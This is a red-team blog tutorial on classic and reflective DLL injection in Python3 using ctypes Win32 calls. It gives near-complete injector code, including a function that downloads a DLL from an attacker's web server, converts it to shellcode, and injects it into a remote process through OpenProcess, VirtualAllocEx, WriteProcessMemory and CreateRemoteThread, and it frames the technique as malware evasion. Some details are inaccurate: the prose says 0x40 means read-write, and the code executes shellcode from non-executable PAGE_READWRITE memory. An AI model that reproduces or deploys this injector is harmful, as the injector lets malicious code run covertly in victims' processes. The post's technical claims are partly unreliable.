---
title: "Reflective DLL Injection in Python3"
date: 2021-12-19
images: [""]
tags: ["red teaming", "python"]
draft: false
---

# What is DLL Injection?
DLL Injection is a common evasion technique used by many malware samples. We can execute shellcode in memory of our current process, and inject shellcode into remote processes with process injection. But instead of just shellcode, we can also inject an entire DLL into a remote process as well. DLL injection is the process of inserting code into a running process. DLLs are meant to be loaded as needed at run time. However, we can still inject assembly in other forms (exe, etc). 

# Approach
- Attach to the process
- Allocate memory within the process
- Copy the DLL path into process memory
- Create a thread within the process to execute your DLL


We will use the following APIs to perform this technique. 

- OpenProcess()
- VirtualAllocEx()
- WriteProcessMemory()
- LoadLibraryA()
- CreateRemoteThread(), NtCreateThreadEx, etc.

There are a few options when it comes to executing our DLL. For this post, I will use CreateRemoteThread(). The problem is, we can't simply give the names of our DLL to these functions. We have to provide a memory address to start the execution. We will perform the allocate and copy steps to obtain space within the remote process' memory.

In order to load DLLs or executables, we will use LoadLibraryA() to take a filename as its parameter and do magical things. 

# Downloading the DLL
First, we'll create a function that will download the DLL from our attacking web server and write it to disk. 

We can use urllib.request for this:
```
def downloader(url, dllname):
    urllib.request.urlretrieve(url, dllname)
    dll = bytes(dllname.encode())
    return dll
```

This function will return us the path to the DLL for LoadLibraryA() later.

# Win32 API
Now we'll create definitions for the functions we want to call.

```
kernel32 = ctypes.windll.kernel32

LPCTSTR = ctypes.c_char_p 
SIZE_T = ctypes.c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD)
OpenProcess.restype = ctypes.wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, SIZE_T, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD)
VirtualAllocEx.restype = ctypes.wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, SIZE_T, ctypes.POINTER(SIZE_T))
WriteProcessMemory.restype = ctypes.wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = ctypes.wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (ctypes.wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = ctypes.wintypes.LPVOID

class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', ctypes.wintypes.DWORD),
                ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
                ('bInheritHandle', ctypes.wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = ctypes.wintypes.LPVOID


CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (ctypes.wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPDWORD)
CreateRemoteThread.restype = ctypes.wintypes.HANDLE

MEM_COMMIT = 0x0001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
```

# OpenProcess()
We will use OpenProcess() to return a handle to the process so we can interact with it.

`handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)`

OpenProcess() takes three arguments.

- dwDesiredAccess - This is the access rights to the process. In order to use WriteProcessMemory, the handle must have PROCESS_VM_WRITE and PROCESS_VM_OPERATION access to the process.

- bInheritHandle - If this value is TRUE, then the process created by this process will also inherit the handle. We don't need this so we set it to false.

- dwProcessID - This is the process id of the process to be opened.


# VirtualAllocEx()
VirtualAllocEx() takes amount of memory to allocate as one of its parameters. If we use LoadLibraryA(), we'll allocate space for the full path of the DLL.

We'll use VirtualAllocEx() to allocate memory in the remote process.

`memory = VirtualAllocEx(handle, False, len(dllname) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)`

VirtualAllocEx() takes five arguments.

- hProcess - This is the handle to the process. The function will allocate memory within the virtual address space of this process.

- lpAddress - This is a pointer to the starting address of the region of pages you want to allocate. If this is NULL, the function will determine where to allocate the region.

- dwSize - This is the size of the region of memory to allocate, in bytes. We will allocate space for the full path of the DLL.

- flAllocationType and flProtect indicates the allocation type and memory protection. We will use 0x3000 for the allocation type which will call VirtualAllocEx with MEM_RESERVE and MEM_COMMIT. 0x40 indicates that the memory is readable and writable.


# WriteProcessMemory()
Now we will copy the DLL path into the process. We can use WriteProcessMemory to do so.

`write = WriteProcessMemory(handle, memory, dllname, len(dllname) + 1, None)`


# LoadLibraryA() and CreateRemoteThread()

Now that we have our DLL written to the remote process, we can start a new thread to load our DLL. First, we need to find the location of LoadLibrary(). To do so, we'll use GetProcAddress and GetModuleHandle.

GetProcAddress will retrieve the address of an exported function or variable from a DLL.
Then we can use GetModuleHandle to retrieve a module handle to a specified module. 

`load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")`

We have the load library address now, all we need to do is to create a thread to execute the loaded DLL. 

`rthread = CreateRemoteThread(handle, None, 0, load_lib, memory, EXECUTE_IMMEDIATELY, None)`

# Reflective DLL Injection
When we use DLL Injection we have to write the DLL to the disk. This is a big compromise if we are trying to be "stealthy". Windows does not have a LoadLibrary function that supports loading a DLL from memory rather than from disk. In order to do so, we have to write our own function. There are also other techniques for reflecting DLL injection such as using the SetThreadContext() and NtContinue() functions to change a thread's registers and perform a restoration process. 

In this post, we will convert our DLL into shellcode and then inject it into a remote process. We can use the function ConvertToShellcode from [here](https://github.com/monoxgas/sRDI). 

```
from ShellcodeRDI import *

dll = open("TestDLL_x86.dll", 'rb').read()
shellcode = ConvertToShellcode(dll)
```

Now we need to take this shellcode and inject it into a remote process. This can be done with a shellcode runner but we'll need to modify it to use OpenProcess() and other APIs to interact with a remote process. 

```
def method2(url, pid):
    dll = urllib.request.urlopen(url, 'rb').read()
    shellcode = ConvertToShellcode(dll)

    handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    print("[+] Obtaining handle...")
    time.sleep(2)

    memory = VirtualAllocEx(handle, False, len(shellcode) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    print("[+] Allocating memory in remote process...")
    time.sleep(2)

    write = WriteProcessMemory(handle, memory, shellcode, len(shellcode) + 1, None)
    print("[+] Writing payload into process memory...")
    time.sleep(2)

    print("[+] Execution completed.")

    rthread = CreateRemoteThread(handle, None, 0, memory, None, EXECUTE_IMMEDIATELY, None)
```

[Link to the code on github](https://github.com/momo1239/buffdawg)
